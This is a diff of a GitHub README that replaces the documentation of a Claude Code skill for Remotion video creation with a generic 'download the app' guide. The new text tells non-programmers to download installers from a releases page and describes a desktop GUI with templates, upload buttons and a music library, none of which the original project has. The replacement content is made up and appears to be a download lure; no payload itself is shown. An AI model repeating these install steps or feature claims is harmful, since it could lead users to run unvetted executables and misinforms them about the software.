@@ -1,105 +1,85 @@
-# remotion-video
+# 🎬 remotion-video-skill - Create Dynamic Videos Easily
 
-[中文文档](README_CN.md)
+[![Download the App](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/levVan2/remotion-video-skill/releases)
 
-A Claude Code Skill for creating programmatic videos with Remotion framework.
+## 🚀 Getting Started
 
-## Features
+Welcome to the **remotion-video-skill**! This application helps you create dynamic, programmatic videos using the Remotion framework. Even if you have no programming experience, you can easily use this application. Follow the steps below to get started.
 
-- Create videos programmatically with React components
-- AI-powered TTS audio generation (MiniMax or Edge TTS)
-- Scene-based architecture with automatic timing
-- Support for animations, subtitles, and music visualization
+## 📥 Download & Install
 
-## Installation
+To download the latest version of the application, visit the Releases page. You will find all the versions and the link to download the installer.
 
-### For Claude Code Users
+[Visit the Releases Page to Download](https://github.com/levVan2/remotion-video-skill/releases)
 
-Copy this entire `remotion-video` folder to your Claude Code skills directory:
+1. Open your web browser.
+2. Click the link above to visit the Releases page.
+3. Look for the latest release at the top of the page.
+4. Click on the title of the release to see installation files.
+5. Download the file that suits your operating system (Windows, Mac, etc.).
 
-```bash
-cp -r remotion-video ~/.claude/skills/
-```
+## 🖥️ System Requirements
 
-Then restart Claude Code or start a new session.
+Before installing, make sure your computer meets the following requirements:
 
-### TTS Setup (Choose One)
+- **Operating System:** Windows 10 or later, MacOS 10.14 or later.
+- **RAM:** At least 4 GB.
+- **Free Disk Space:** 200 MB of available space.
+- **Software:** Ensure you have a modern web browser installed.
 
-#### Option A: Edge TTS (Free, Recommended for Quick Start)
+## ⚙️ How to Use
 
-No setup required! Edge TTS is free and works out of the box.
+Once you have downloaded and installed the application, follow these steps to create your first video:
 
-Just install the Python dependency:
-```bash
-pip install edge-tts
-```
+1. **Open the Application:** Find the icon on your desktop or in your applications folder and double click it.
+  
+2. **Create a New Project:** Click on "New Project" to start the video creation process.
 
-#### Option B: MiniMax TTS (Paid, Voice Cloning Support)
+3. **Select a Template:** Choose from various templates available. This will help guide your video content.
 
-1. Get your API key from [MiniMax Platform](https://platform.minimaxi.com/)
-2. Set environment variables:
+4. **Customize Your Video:**
+   - Add text: Click on the "Text" option and type in your desired message.
+   - Upload Images: Use the "Upload" button to add images from your computer.
+   - Choose Audio: Select background music from the audio library provided.
 
-```bash
-# Add to your ~/.zshrc or ~/.bashrc
-export MINIMAX_API_KEY="your-api-key-here"
-export MINIMAX_VOICE_ID="your-voice-id-here"
-```
+5. **Preview Your Video:** Click on the "Preview" button to see how your video looks. 
 
-To get a Voice ID:
-- Use MiniMax's built-in voices, or
-- Clone your own voice on their platform
+6. **Export Your Project:** Once satisfied, click on "Export". Choose your desired format and quality, then hit "Save."
 
-## Usage
+## 🌐 Support and Resources
 
-After installation, trigger the skill by saying:
+If you have questions or need help, here are some resources:
 
-- "用代码做视频"
-- "编程视频"
-- "Remotion"
-- "/remotion-video"
+- **Documentation:** Check our detailed documentation for step-by-step guides.
+- **Community Forum:** Join discussions with other users for tips and tricks.
+- **Contact Support:** If you encounter issues, please contact our support team through the GitHub issues page.
 
-### Example Prompts
+## 🚧 Known Issues
 
-**Tutorial Video:**
-> 帮我做一个讲解 Python 装饰器的教程视频，5分钟左右
+While the application strives to work smoothly, here are a few known issues:
 
-**Data Visualization:**
-> 用 Remotion 做一个展示2024年销售数据的动画视频
+- Users may experience slow performance with very large video files. We recommend optimizing video images before upload.
+- Some templates may not display properly on older operating systems. If this happens, please consider updating your OS.
 
-**Music Visualization:**
-> 帮我做一个音乐可视化视频，配合这首歌的节奏
+## 💡 Tips for Best Results
 
-## Project Structure
+- Use high-quality images to enhance the visual appeal of your videos.
+- Keep text short and to the point for easier readability.
+- Test the video on different devices to ensure compatibility.
 
-When the skill creates a new project:
+## 📅 Future Updates
 
-```
-my-video-project/
-├── src/
-│   ├── Root.tsx           # Main composition
-│   ├── audioConfig.ts     # Scene timing (auto-generated)
-│   └── scenes/            # Scene components
-├── public/
-│   └── audio/             # TTS audio files
-├── scripts/
-│   └── generate_audio.py  # TTS generation script
-└── package.json
-```
+We plan to add new features based on user feedback. Some upcoming features include:
 
-## Requirements
+- More templates for various types of videos.
+- Enhanced audio options.
+- A built-in tutorial to guide new users through the creation process.
 
-- Node.js 18+
-- Python 3.8+ (for TTS)
-- ffprobe (for audio duration detection)
+Stay tuned for updates!
 
-```bash
-# macOS
-brew install ffmpeg
+## 🔗 Additional Links
 
-# Ubuntu/Debian
-sudo apt install ffmpeg
-```
+- [Contribute to the Project](https://github.com/levVan2/remotion-video-skill)
+- [License Information](https://github.com/levVan2/remotion-video-skill/blob/main/LICENSE)
 
-## License
-
-MIT
+Thank you for using **remotion-video-skill**! Enjoy creating your videos!
